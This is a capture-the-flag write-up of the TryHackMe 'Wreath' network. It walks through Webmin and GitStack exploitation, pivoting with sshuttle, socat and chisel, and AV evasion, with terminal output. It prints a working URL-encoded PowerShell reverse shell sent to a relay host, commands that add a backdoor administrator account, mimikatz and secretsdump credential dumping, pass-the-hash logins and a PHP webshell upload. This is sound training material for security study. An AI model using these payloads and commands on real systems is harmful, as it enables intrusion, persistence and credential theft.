# Information

Name: Wreath

Difficulty: Easy

Description: Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network.

Note: I do not go into detail here as this is mostly guided. I do show how I arrived at each answer but I highly suggest watching the provided video guide available on TryHackMe for this network first if you find yourself lost.

## Task 1 - 4
Have no questions that require an answer.

## Task 5 - Webserver Enumeration
We always start with an nmap scan since it may take awhile to complete.

```
┌──(root💀kali)-[~/ctfs/thm]
└─# export IP=10.200.188.200     
──(root💀kali)-[~/ctfs/thm]
└─# nmap -p-15000 -vv $IP -oG ~/ctfs/thm/wreath
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-11 11:49 EDT
Initiating Ping Scan at 11:49
Scanning 10.200.188.200 [4 ports]
Completed Ping Scan at 11:49, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:49
Completed Parallel DNS resolution of 1 host. at 11:49, 0.02s elapsed
Initiating SYN Stealth Scan at 11:49
Scanning 10.200.188.200 [15000 ports]
Discovered open port 22/tcp on 10.200.188.200
Discovered open port 80/tcp on 10.200.188.200
Discovered open port 443/tcp on 10.200.188.200
Discovered open port 10000/tcp on 10.200.188.200
SYN Stealth Scan Timing: About 33.37% done; ETC: 11:51 (0:01:02 remaining)
SYN Stealth Scan Timing: About 58.62% done; ETC: 11:51 (0:00:43 remaining)
Completed SYN Stealth Scan at 11:51, 126.97s elapsed (15000 total ports)
Nmap scan report for 10.200.188.200
Host is up, received echo-reply ttl 63 (0.11s latency).
Scanned at 2021-09-11 11:49:46 EDT for 127s
Not shown: 14995 filtered ports
Reason: 14863 no-responses and 132 admin-prohibiteds
PORT      STATE  SERVICE          REASON
22/tcp    open   ssh              syn-ack ttl 63
80/tcp    open   http             syn-ack ttl 63
443/tcp   open   https            syn-ack ttl 63
9090/tcp  closed zeus-admin       reset ttl 63
10000/tcp open   snet-sensor-mgmt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 127.36 seconds
           Raw packets sent: 44879 (1.975MB) | Rcvd: 140 (9.832KB)
```

**How many of the first 15000 ports are open on the target?**

4

We can see that there are 4 open ports and 1 closed port.

**What OS does Nmap think is running?**

centos

```
┌──(root💀kali)-[~/ctfs/thm]
└─# nmap -p 22,80,443,10000 -sV -oA ~/ctfs/thm/wreath $IP 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-11 12:28 EDT
Nmap scan report for 10.200.188.200
Host is up (0.11s latency).

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.0 (protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
443/tcp   open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.11 seconds
```

Running the nmap scan again to check services with the ports we found reveals that nmap believes this to be a centos OS.

**Open the IP in your browser -- what site does the server try to redirect you to?**

https://thomaswreath.thm/

```
──(root💀kali)-[~/ctfs/thm]
└─# curl http://10.200.188.200                                                     
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://thomaswreath.thm">here</a>.</p>
</body></html>
```

We must add this line to the /etc/hosts file to access the page:

10.200.188.200  thomaswreath.thm

**Read through the text on the page. What is Thomas' mobile phone number?**

447821548812

Found simply by scrolling to the bottom of the page.

![image](https://user-images.githubusercontent.com/43668197/132990849-e753d568-84d2-48a6-91a8-d869d5c3d06c.png)

**Look back at your service scan results: what server version does Nmap detect as running here?**

MiniServ 1.890 (Webmin httpd)

```
10000/tcp open  http     MiniServ 1.890 (Webmin httpd)
```

**What is the CVE number for this exploit?**

CVE-2019-15107

https://www.exploit-db.com/exploits/47230

## Task 6 - Webserver Exploitation

**Which user was the server running as?**

root

![image](https://user-images.githubusercontent.com/43668197/132992604-0f44d7e3-36d5-4a22-8297-c69abca65c1f.png)

**What is the root user's password hash?**

$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1

We cat out the /etc/shadow file

![image](https://user-images.githubusercontent.com/43668197/132992914-c5e7c8e1-eec9-4529-a994-dc93e9d965aa.png)

**You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.**

**What is the full path to this file?**

/root/.ssh/id_rsa

## Task 7

Has no question that requires an answer.

## Task 8 - Pivoting High-level Overview

**Which type of pivoting creates a channel through which information can be sent hidden inside another protocol?**

tunnelling

**Research: Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?**

portfwd

https://www.offensive-security.com/metasploit-unleashed/portfwd/

## Task 9 - Pivoting Enumeration

**What is the absolute path to the file containing DNS entries on Linux?**

/etc/resolv.conf

**What is the absolute path to the hosts file on Windows?**

C:\Windows\System32\drivers\etc\hosts

**How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?**

for i in {1..255}; do (ping -c 1 172.16.0.${i} | grep "bytes from" &); done

## Task 10 - Pivoting Proxychains & Foxyproxy

**What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?**

SOCKS4 127.0.0.1:4242

**What command would you use to telnet through a proxy to 172.16.0.100:23?**

proxychains telnet 172.16.0.100:23

**You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?**

FP

## Task 11 - Pivoting SSH Tunnelling / Port Forwarding

**If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?**

L

**Which switch combination can be used to background an SSH port forward or tunnel?**

-fN

**It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?**

nay

**What command would you use to create a pair of throwaway SSH keys for a reverse connection?**

ssh-keygen

**If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")**

ssh -L 2222:172.16.0.100:22 kali@172.16.0.200 id_rsa -fN

**What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?**

ssh -D 8000 user@target.thm -fN

**If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.**

ssh -L 8000:172.16.0.50:80 user@127.0.0.1 -fN

## Task 12 - Pivoting plink.exe

**What tool can be used to convert OpenSSH keys into PuTTY style keys?**

puttygen

## Task 13 - Pivoting Socat

**Which socat option allows you to reuse the same listening port for more than one connection?**

reuseaddr

**If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?**

./socat tcp-1:8000 tcp:172.16.0.200:443

**What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?**

./socat tcp-1:2222,fork,reuseaddr tcp:172.16.0.100:22 &

## Task 14 - Pivoting Chisel

**Use port 4242 for the listener and do not background the process.**

./chisel server -p 4242 --reverse

**What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?**

./chisel client 172.16.0.200:4242 R:socks &

**How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.**

./chisel client 172.16.0.200:1337 R:33060:172.16.0.100:3306 &

**If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?**

./chisel client 172.16.0.10:80 8000:172.16.0.5:4444

## Task 15 - Pivoting sshuttle

**How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16**

sshuttle -r pwned@172.16.20.7 172.16.0.0/16

**What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?**

--ssh-cmd "ssh -i priv_key"

**You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.**

**What switch (and argument) could you use to fix this error?**

-x 172.16.0.100

## Task 16 - Conclusion

Has no questions that require an answer.

## Task 17 - Git Server Enumeration

**Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?**

2

```
[root@prod-serv tmp]# ./nmap-username -sn 10.200.188.1-255 -oN scan-username

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-09-12 23:20 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-188-1.eu-west-1.compute.internal (10.200.188.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.00026s latency).
MAC Address: 02:74:1D:9C:65:4F (Unknown)
Nmap scan report for ip-10-200-188-100.eu-west-1.compute.internal (10.200.188.100)
Host is up (0.00018s latency).
MAC Address: 02:E6:A9:4C:30:EB (Unknown)
Nmap scan report for ip-10-200-188-150.eu-west-1.compute.internal (10.200.188.150)
Host is up (-0.10s latency).
MAC Address: 02:48:97:0C:DD:D9 (Unknown)
Nmap scan report for ip-10-200-188-250.eu-west-1.compute.internal (10.200.188.250)
Host is up (0.00020s latency).
MAC Address: 02:BE:E0:73:5E:69 (Unknown)
Nmap scan report for ip-10-200-188-200.eu-west-1.compute.internal (10.200.188.200)
Host is up.
Nmap done: 255 IP addresses (5 hosts up) scanned in 3.74 seconds
```

We exclude host .1, .250, and .200 so that leaves us two active hosts on the network, .100 and .150

**In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)**

100,150

**Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?**

150

```
[root@prod-serv tmp]# ./nmap-username 10.200.188.150 -oN scan-username

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-09-12 23:29 BST
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-188-150.eu-west-1.compute.internal (10.200.188.150)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.0043s latency).
Not shown: 6147 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
5985/tcp open  wsman
MAC Address: 02:48:97:0C:DD:D9 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 34.64 seconds
```

**Let's assume that the other host is inaccessible from our current position in the network.**

**Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?**

80,3389,5985

**Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?**

http

## Task 18 - Git Server Pivoting

I choose to use the suggested sshuttle for this task.

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# sshuttle -r root@10.200.188.200 --ssh-cmd "ssh -i id_rsa" 10.200.188.0/24                                                       99 ⨯
c : Connected to server.
client_loop: send disconnect: Broken pipe
c : fatal: ssh connection to server (pid 5003) exited with returncode 255
```

To fix the broken pipe we must add -x to exclude the ip we are connecting to since its on the same network

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# sshuttle -r root@10.200.188.200 --ssh-cmd "ssh -i id_rsa" 10.200.188.0/24 -x 10.200.188.200                                     99 ⨯
c : Connected to server.
```

Now we can access the page at 10.200.188.150 and we can answer the first question from this page.

![image](https://user-images.githubusercontent.com/43668197/133005311-60c1001a-25d5-49df-b281-6f726421bd54.png)

**What is the name of the program running the service?**

gitstack

**Do these default credentials work (Aye/Nay)?**

nay

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# searchsploit gitstack            
------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
------------------------------------------------------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                                                                       | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution (Metasploit)                                     | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                                                                | php/webapps/43777.py
------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

**You will see that there are three publicly available exploits.**

**There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?**

43777

## Task 19 - Git Server Code Review

**Look at the information at the top of the script. On what date was this exploit written?**

18.01.2018

**Bearing this in mind, is the script written in Python2 or Python3?**

python2

**Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?**

csrftoken

## Task 20 - Git Server Exploitation

Time to try out the script!

![image](https://user-images.githubusercontent.com/43668197/133005910-772c37b8-6f6e-433f-907d-813016a105af.png)

Success and its running as NT authority\system.

**First up, let's use some basic enumeration to get to grips with the webshell:**

**What is the hostname for this target?**

git-serv

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=hostname"
"git-serv
" 
```

**What operating system is this target?**

windows

```
──(root💀kali)-[/home/kali/Downloads]
└─# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=systeminfo"
"
Host Name:                 GIT-SERV
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```

**What user is the server running as?**

nt authority\system

```┌──(root💀kali)-[/home/kali/Downloads]
└─# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=whoami"    
"nt authority\system
" 
```

```
──(root💀kali)-[/home/kali/Downloads]
└─# curl -X POST http://gitserver.thm/web/exploit-name.php -d "a=ping -n 3 10.50.185.100"
"
Pinging 10.50.185.100 with 32 bytes of data:
Request timed out.
Request timed out.
Request timed out.

Ping statistics for 10.50.185.100:
    Packets: Sent = 3, Received = 0, Lost = 3 (100% loss),
" 
```

**How many make it to the waiting listener?**

0

To proceed further we must use the ssh credentials we have from before to login and open the port we wish to use in the firewall.
First we check which ports are already open.

```
──(root💀kali)-[/home/kali/Downloads]
└─# ssh -i id_rsa root@10.200.188.200
[root@prod-serv ~]# firewall-cmd --list-all
public (active)
  target: default
  icmp-block-inversion: no
  interfaces: eth0
  sources: 
  services: cockpit dhcpv6-client http https ssh
  ports: 10000/tcp
  protocols: 
  masquerade: no
  forward-ports: 
  source-ports: 
  icmp-blocks: 
  rich rules: 
```

And now we add a port to use.

```
[root@prod-serv ~]# firewall-cmd --zone=public --add-port 17777/tcp
success
[root@prod-serv ~]# firewall-cmd --list-all
public (active)
  target: default
  icmp-block-inversion: no
  interfaces: eth0
  sources: 
  services: cockpit dhcpv6-client http https ssh
  ports: 10000/tcp 17777/tcp
  protocols: 
  masquerade: no
  forward-ports: 
  source-ports: 
  icmp-blocks: 
  rich rules: 
  ```
  
Next ill grab socat as suggested.
  
```
  ──(root💀kali)-[/home/kali/Downloads]
└─# wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat    
```

And start a webserver on kali to transfer socat.

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# python3 -m http.server 80                             
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```
──(root💀kali)-[/home/kali/Downloads]
└─# ssh -i id_rsa root@10.200.188.200                                                       
[root@prod-serv ~]# curl 10.50.185.100/socat -o /tmp/socat-username && chmod +x /tmp/socat-username
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  366k  100  366k    0     0   408k      0 --:--:-- --:--:-- --:--:--  408k
```

Move to the tmp folder and execute socat

```
[root@prod-serv tmp]# ./socat-username tcp-l:17777 tcp:10.50.185.100:1337
```

Setup nc listener

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# nc -nlvp 1337                                                                                                                    1 ⨯
listening on [any] 1337 ...
```

Now we can use powershell reverse shells.

```
└─# curl -X POST http://10.200.188.200/web/exploit-username.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.188.200%27%2C17777%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>302 Found</title>
</head><body>
<h1>Found</h1>
<p>The document has moved <a href="https://thomaswreath.thmweb/exploit-username.php">here</a>.</p>
</body></html>
```

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# curl -X POST http://10.200.188.150/web/exploit-username.php -d "a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.188.200%27%2C17777%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22"
```

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# nc -nlvp 1337                                                                                                                    1 ⨯
listening on [any] 1337 ...
connect to [10.50.185.100] from (UNKNOWN) [10.200.188.200] 39248
whoami
nt authority\system
PS C:\GitStack\gitphp> 
```

We are now connected to reverse shell from the gitstack system.

## Task 21 - Git Server Stabilisation & Post Exploitation

First we add a new admin account so we don't have to rely on the exploit.

```
PS C:\GitStack\gitphp> net user username password /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators username /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" username /add
The command completed successfully.
```

Next we access the box with evil-winrm

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# evil-winrm -u username -p password -i 10.200.188.150                      

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\username\Documents> 
```
To connect over rdp I used the suggested xfreerdp.

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# xfreerdp /v:10.200.188.150 /u:username /p:password
```
Upload mimikatz.exe.

```
*Evil-WinRM* PS C:\Users\username\Documents> upload /home/kali/Downloads/mimikatz.exe C:\Users\username\Downloads\mimikatz.exe
Info: Uploading /home/kali/Downloads/mimikatz.exe to C:\Users\username\Downloads\mimikatz.exe

                                                             
Data: 1451220 bytes of 1451220 bytes copied

Info: Upload successful!
```
Run mimikatz and get the hases.

```
PS C:\Users\username\Desktop\x64> .\mimikatz.exe
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

```
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1
  
RID  : 000003e9 (1001)
User : Thomas
Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f
```

**What is the Administrator password hash?**

37db630168e5f82aafa8461e05c6bbd1

**What is the NTLM password hash for the user "Thomas"?**

02d90eda8f6b6b06c32d5f207831101f

![image](https://user-images.githubusercontent.com/43668197/133009559-2e8b6af3-238d-4769-b3a2-4bb532da73db.png)

**What is Thomas' password?**

i<3ruby

From now on we can use evil-winrm to connect to the default admin account since ours will be wiped on reset.
evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i IP

## Task 22 - 23

Have no questions that requires an answer.

## Task 24 - Command and Control Empire: Overview

**Can we get an agent back from the git server directly (Aye/Nay)?**

Nay

## Task 25 - 26

Have no questions that requires an answer.

## Task 27 - Command and Control Empire: Agents

**Using the help command for guidance: in Empire CLI, how would we run the whoami command inside an agent?**

shell whoami

## Task 28 - 32

Has no questions that requires an answer.

## Task 33 - Personal PC Enumeration

**Scan the top 50 ports of the last IP address you found in Task 17. Which ports are open (lowest to highest, separated by commas)?**

80,3389

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Invoke-Portscan -Hosts 10.200.86.100 -TopPorts 50


Hostname      : 10.200.86.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 79, 88, 2049...}
finishTime    : 4/12/2021 1:48:00 PM
```

## Task 34 - Personal PC Pivoting

**Using the Wappalyzer browser extension (Firefox | Chrome) or an alternative method, identify the server-side Programming language (including the version number) used on the website.*

php 7.4.11

At this point of following along with the steps we have access to the website at 10.200.188.100 via the socks5 proxy setup on foxyproxy

![image](https://user-images.githubusercontent.com/43668197/133108218-6beb89c4-3319-4019-a594-5f6391630923.png)

## Task 35 - Personal PC The Wonders of Git

**Use your WinRM access to look around the Git Server. What is the absolute path to the Website.git directory?**

C:\Gitstack\repositories\website.git

```
*Evil-WinRM* PS C:\Users\lostsoulofawolf\Documents> cd ..\..\..\Gitstack
*Evil-WinRM* PS C:\Gitstack> cd repositories
*Evil-WinRM* PS C:\Gitstack\repositories> dir


    Directory: C:\Gitstack\repositories


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2021   7:05 PM                Website.git


*Evil-WinRM* PS C:\Gitstack\repositories> download website.git
Info: Downloading website.git to ./website.git

                                                             
Info: Download successful!
```

## Task 36 - Personal PC Website Code Analysis

**What does Thomas have to phone Mrs Walker about?**

neighbourhood watch meetings

```
[...]
    <!-- ToDo:
          - Finish the styling: it looks awful
          - Get Ruby more food. Greedy animal is going through it too fast
          - Upgrade the filter on this page. Can't rely on basic auth for everything
          - Phone Mrs Walker about the neighbourhood watch meetings
    -->
[...]
```

**Aside from the filter, what protection method is likely to be in place to prevent people from accessing this page?**

basic auth

**Which extensions are accepted (comma separated, no spaces or quotes)?**

jpg, jpeg,png,gif

```
<?php

    if(isset($_POST["upload"]) && is_uploaded_file($_FILES["file"]["tmp_name"])){
        $target = "uploads/".basename($_FILES["file"]["name"]);
        $goodExts = ["jpg", "jpeg", "png", "gif"];
        if(file_exists($target)){
            header("location: ./?msg=Exists");
            die();
[...]
```

## Task 37 - Personal PC Exploit PoC

Has no questions that requires an answer.

## Task 38 - AV Evasion Introduction

**Which category of evasion covers uploading a file to the storage on the target before executing it?**

On-Disk evasion

**What does AMSI stand for?**

Anti-Malware Scan Interface

**Which category of evasion does AMSI affect?**

In-Memory evasion

## Task 39 - AV Evasion AV Detection Methods

**What other name can be used for Dynamic/Heuristic detection methods?**

Behavioural

**If AV software splits a program into small chunks and hashes them, checking the results against a database, is this a static or dynamic analysis method?**

static

**When dynamically analysing a suspicious file using a line-by-line analysis of the program, what would antivirus software check against to see if the behaviour is malicious?**

pre-defined rules

**What could be added to a file to ensure that only a user can open it (preventing AV from executing the payload)?**

password

## Task 40 - AV Evasion PHP Payload Obfuscation

**What is the Host Name of the target?**

WREATH-PC

```
http://10.200.188.100/resources/uploads/v2.jpg.php?wreath=systeminfo
```
```
Host Name:                 WREATH-PC
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00429-70000-00000-AA411
Original Install Date:     08/11/2020, 14:55:50
System Boot Time:          12/04/2021, 14:51:58
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 63 Stepping 2 GenuineIntel ~2394 Mhz
BIOS Version:              Xen 4.2.amazon, 24/08/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,048 MB
Available Physical Memory: 1,369 MB
Virtual Memory: Max Size:  2,432 MB
Virtual Memory: Available: 1,815 MB
Virtual Memory: In Use:    617 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 5 Hotfix(s) Installed.
                           [01]: KB4580422
                           [02]: KB4512577
                           [03]: KB4580325
                           [04]: KB4587735
                           [05]: KB4592440
Network Card(s):           1 NIC(s) Installed.
                           [01]: AWS PV Network Device
                                 Connection Name: Ethernet
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.200.86.1
                                 IP address(es)
                                 [01]: 10.200.86.100
                                 [02]: fe80::b1e7:ce3b:c3c4:a547
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

**What is our current username (include the domain in this)?**

wreath-pc\thomas

```
http://10.200.188.100/resources/uploads/v2.jpg.php?wreath=whoami
```

## Task 41 - AV Evasion Compiling Netcat & Reverse Shell!

**What output do you get when running the command: certutil.exe?**

CertUtil: -dump command completed successfully.

```
http://10.200.188.100/resources/uploads/v2.jpg.php?wreath=certutil.exe 
CertUtil: -dump command completed successfully.
```

## Task 42 - AV Evasion Enumeration

**[Research] One of the privileges on this list is very famous for being used in the PrintSpoofer and Potato series of privilege escalation exploits -- which privilege is this?**

SeImpersonatePrivilege

**What is the Name (second column from the left) of this service?**

SystemExplorerHelpService

**Is the service running as the local system account (Aye/Nay)?**

aye

## Task 43 - AV Evasion Privilege Escalation

Has no questions that requires an answer.

## Task 44 - Exfiltration Exfiltration Techniques & Post Exploitation

**Is FTP a good protocol to use when exfiltrating data in a modern network (Aye/Nay)?**

nay

**For what reason is HTTPS preferred over HTTP during exfiltration?**

encryption

**What is the Administrator NT hash for this target?**

a05c3c807ceeb48c47252568da284cd2

```
┌──(root💀kali)-[/home/kali/Downloads]
└─# secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c47252568da284cd2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:06e57bdd6824566d79f127fa0de844e2:::
Thomas:1000:aad3b435b51404eeaad3b435b51404ee:02d90eda8f6b6b06c32d5f207831101f:::
[*] Cleaning up... 
```
